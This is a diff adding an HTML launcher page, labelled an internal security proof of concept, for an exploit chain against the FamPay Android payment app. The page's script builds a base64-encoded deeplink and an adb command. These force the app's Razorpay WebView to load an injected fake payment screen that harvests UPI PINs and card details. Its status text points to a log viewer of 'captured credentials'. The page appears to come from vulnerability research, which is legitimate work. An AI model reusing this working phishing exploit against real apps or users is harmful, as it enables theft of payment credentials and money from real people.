@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chain E — HTML Injection Phishing PoC</title>
+<style>
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { background: #0a0a0f; color: #e0e0e0; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 16px; gap: 14px; }
+  .badge { font-size: 10px; background: #1a0010; border: 1px solid #ff1744; color: #ff6060; padding: 3px 12px; border-radius: 20px; letter-spacing: 1px; }
+  .logo { font-size: 28px; font-weight: 900; color: #00d084; }
+  .title { font-size: 15px; font-weight: 700; color: #fff; }
+  .subtitle { font-size: 12px; color: #666; text-align: center; max-width: 340px; line-height: 1.6; }
+  .card { background: #13131a; border: 1px solid #2a2a3a; border-radius: 12px; padding: 20px; width: 100%; max-width: 420px; }
+  .info-row { display: flex; justify-content: space-between; align-items: center; padding: 7px 0; border-bottom: 1px solid #1a1a2a; font-size: 12px; }
+  .info-row:last-child { border: none; }
+  .info-row .k { color: #666; }
+  .info-row .v { color: #00e676; font-family: monospace; font-size: 11px; word-break: break-all; text-align: right; max-width: 240px; }
+  .deeplink-box { background: #0d0d14; border: 1px solid #1a1a2a; border-radius: 6px; padding: 10px 12px; margin-top: 14px; font-size: 10px; font-family: monospace; word-break: break-all; color: #448aff; line-height: 1.6; }
+  .deeplink-box .dl { color: #888; margin-bottom: 4px; font-size: 9px; letter-spacing: 0.5px; }
+  .btn-fire { width: 100%; max-width: 420px; padding: 18px; background: #d50000; color: #fff; border: none; border-radius: 10px; font-weight: 800; font-size: 16px; cursor: pointer; transition: transform 0.1s, opacity 0.1s; }
+  .btn-fire:active { transform: scale(0.97); opacity: 0.9; }
+  .btn-fire:disabled { background: #2a0000; color: #4a0000; cursor: default; }
+  .btn-secondary { width: 100%; max-width: 420px; padding: 12px; background: transparent; color: #448aff; border: 1px solid #2a2a4a; border-radius: 8px; font-size: 12px; font-weight: 600; cursor: pointer; }
+  #adbSection { width: 100%; max-width: 420px; display: none; }
+  .adb-box { background: #0d0d14; border: 1px solid #2a2a3a; border-radius: 6px; padding: 12px; font-family: monospace; font-size: 11px; color: #00e676; word-break: break-all; line-height: 1.7; cursor: pointer; }
+  .adb-label { font-size: 9px; color: #555; margin-bottom: 6px; letter-spacing: 0.5px; }
+  .copy-hint { font-size: 10px; color: #555; text-align: center; margin-top: 6px; }
+  #status { font-size: 11px; color: #666; min-height: 16px; text-align: center; }
+  #status.ok { color: #00d084; }
+  #status.err { color: #ff1744; }
+  .links { display: flex; gap: 16px; font-size: 11px; flex-wrap: wrap; justify-content: center; }
+  .links a { color: #448aff; text-decoration: none; }
+  .chain-tag { font-size: 10px; color: #d50000; border: 1px solid #d50000; padding: 2px 8px; border-radius: 4px; }
+</style>
+</head>
+<body>
+
+<span class="badge">INTERNAL SECURITY PoC</span>
+<div class="logo">FamPay</div>
+<span class="chain-tag">CHAIN E — Vuln #11 + #2</span>
+<div class="title">HTML Injection — Fake Payment UI Phishing</div>
+<div class="subtitle">Injects a fake Razorpay/FamPay payment screen inside the app's WebView. User sees a convincing in-app UI asking for UPI PIN or card details.</div>
+
+<div class="card">
+  <div class="info-row"><span class="k">Target app</span><span class="v">com.fampay.in</span></div>
+  <div class="info-row"><span class="k">Vuln #11</span><span class="v">HTML Injection in Razorpay WebView</span></div>
+  <div class="info-row"><span class="k">Technique</span><span class="v">loadDataWithBaseURL("https://api.razorpay.com", …)</span></div>
+  <div class="info-row"><span class="k">Impact</span><span class="v">Credential phishing inside trusted app context</span></div>
+  <div class="info-row"><span class="k">Payload URL</span><span class="v" id="exploitUrlDisplay">generating...</span></div>
+  <div class="deeplink-box">
+    <div class="dl">DEEPLINK</div>
+    <span id="deeplinkDisplay">generating...</span>
+  </div>
+</div>
+
+<button class="btn-fire" id="fireBtn" onclick="fire()">&#127919;&nbsp; LAUNCH PHISHING UI</button>
+<button class="btn-secondary" onclick="toggleAdb()">Show ADB Command</button>
+
+<div id="adbSection">
+  <div class="adb-box" onclick="copyAdb()">
+    <div class="adb-label">ADB COMMAND — tap to copy</div>
+    <span id="adbCmd"></span>
+  </div>
+  <div class="copy-hint">Paste in terminal connected to test device</div>
+</div>
+
+<div id="status">Ready</div>
+
+<div class="links">
+  <a href="/log-viewer">&#128225; Log Viewer</a>
+  <a href="/chain-e-exploit">&#9889; Exploit page</a>
+  <a href="/chain-e-report">&#128203; Report</a>
+  <a href="/">&#8592; All Chains</a>
+</div>
+
+<script>
+(function init() {
+  const origin = location.origin;
+  const exploitUrl = origin + '/chain-e-exploit'
+    + '?fp_type=fpSurvey'
+    + '&fp_auth_req=true'
+    + '&fp_new_window=true'
+    + '&source=app'
+    + '&platform=android';
+
+  const b64      = btoa(exploitUrl);
+  const deeplink = 'fp://fampay.in/home_init/?init_deeplink=' + b64;
+  const adbCmd   = `adb shell am start -a android.intent.action.VIEW -d "${deeplink}" com.fampay.in`;
+
+  document.getElementById('exploitUrlDisplay').innerText = origin + '/chain-e-exploit';
+  document.getElementById('deeplinkDisplay').innerText   = deeplink;
+  document.getElementById('adbCmd').innerText            = adbCmd;
+
+  window._deeplink = deeplink;
+  window._adbCmd   = adbCmd;
+})();
+
+function fire() {
+  const btn = document.getElementById('fireBtn');
+  const st  = document.getElementById('status');
+  btn.disabled = true;
+  st.className = 'ok';
+  st.innerText = 'Opening FamPay with phishing payload...';
+  window.location.href = window._deeplink;
+  setTimeout(() => {
+    btn.disabled = false;
+    st.innerText = 'Check Log Viewer for captured credentials. Use ADB if app did not open.';
+    st.className = '';
+  }, 3000);
+}
+
+function toggleAdb() {
+  const s = document.getElementById('adbSection');
+  s.style.display = s.style.display === 'none' || s.style.display === '' ? 'block' : 'none';
+}
+
+function copyAdb() {
+  navigator.clipboard.writeText(window._adbCmd).then(() => {
+    document.getElementById('status').innerText = '✓ ADB command copied!';
+    document.getElementById('status').className = 'ok';
+  });
+}
+</script>
+</body>
+</html>
